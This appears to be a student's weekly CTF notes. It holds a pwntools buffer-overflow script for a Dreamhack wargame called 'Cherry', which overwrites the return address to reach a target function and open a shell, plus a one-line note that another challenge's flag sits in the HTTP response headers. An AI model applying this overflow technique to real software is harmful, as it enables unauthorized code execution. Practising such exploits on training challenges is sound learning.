Week4

## [War Game] [Cherry]

from pwn import *

#p = remote("host8.dreamhack.games", 18231)
p = process("./chall")

p.send(b'cherry' + b'a' * 6 + p32(0xf0))

payload = (b'a' * 18)
payload += (b'a' * 8)
payload += p64(0x4012bc)
p.send(payload)

p.interactive()

## [War Game] [[wargame.kr] already got]

Just HTTP Response 헤더 확인 > Flag 캐치
